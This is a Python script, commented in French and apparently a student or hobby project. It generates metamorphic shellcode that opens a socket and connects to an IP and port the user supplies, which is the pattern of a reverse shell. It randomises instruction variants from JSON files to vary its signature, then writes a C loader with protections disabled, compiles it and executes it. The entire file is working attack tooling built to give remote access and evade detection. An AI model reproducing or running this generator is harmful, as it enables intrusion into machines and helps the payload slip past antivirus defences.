import random
import sys
import json
from colorama import init, Fore, Style
import subprocess
print("------------------------Bienvenue dans notre programme de génération de shellcode metamorphique !------------------------")

init(autoreset=True)

def validate_args(): # on valide les arguments
    if len(sys.argv) != 3:
        print(Fore.RED + "les parametres ne sont pas valides.il faut faire python gen.py <IP> <PORT>")
        exit(1)
    return sys.argv[1], sys.argv[2] # ca retourne l'IP et le port

def ip2hex(ip):
    try:
        hex_parts = (format(int(byte), '02X') for byte in ip.split('.')) # Convertir chaque byte en hexadécimal
        return ''.join(hex_parts)
    except ValueError:
        print(Fore.RED + "Invalid IP.")
        exit(1)

def port2hex(port):
    try:
        return format(int(port), '04X') # il permet de convertir le port en hexadécimal
    except ValueError:
        print(Fore.RED + "Invalid Port.") # on peut afficher une erreur si le port est invalide
        exit(1)

def format_shellcode(s):
    return ''.join(f'\\x{a}{b}' for a, b in zip(s[::2], s[1::2])) # on formate le code en hexadécimal

def load_json(file):
    with open(file, 'r') as f:
        return json.load(f) # on charge le fichier json

def generate_shellcode(ip_hex, port_hex): # on genere le shellcode
    shellcode = ""
    socket_steps = load_json('socket_creation_steps.json') # on charge les étapes de création du socket
    for step, options in socket_steps.items():
        shellcode += random.choice(options)

    connection_steps = load_json('connection_steps.json') # permet de charger les étapes de connexion
    connection_steps["connection_socket_5"] = ["68" + ip_hex]  
    connection_steps["connection_socket_6"] = ["6668" + port_hex]  

    for step, options in connection_steps.items():
        shellcode += random.choice(options)
    
    return shellcode

def create_c_program(shellcode):
    return f'''
#include <stdio.h>
#include <string.h>

int main(void) {{
    char code[] = "{shellcode}";
    int (*ret)() = (int(*)())code;
    ret();
}}
'''
# permet de creer le programme en C
def compile_and_run():
    compile_command = ['gcc', 'shellcode.c', '-w', '-fno-stack-protector', '-z', 'execstack', '-no-pie', '-o', 'shellcode.bin']
    subprocess.run(compile_command)
    subprocess.run(['./shellcode.bin'])

# permet de compiler et d'executer le programme en C
def main():
    ipv4, port = validate_args()
    ipv4_hex = ip2hex(ipv4)
    port_hex = port2hex(port)
    shellcode = generate_shellcode(ipv4_hex, port_hex)
    formatted_shellcode = format_shellcode(shellcode)
    
    print(Fore.CYAN + "Shellcode size: " + Fore.WHITE + str(len(shellcode)) + " bytes")
    print("\n" + Fore.GREEN + "Generated Shellcode: \n" + Fore.YELLOW + formatted_shellcode + "\n")
    
    c_program = create_c_program(formatted_shellcode)
    with open('shellcode.c', 'w') as f:
        f.write(c_program)

    compile_and_run()

if __name__ == "__main__":
    main() # on appelle la fonction main
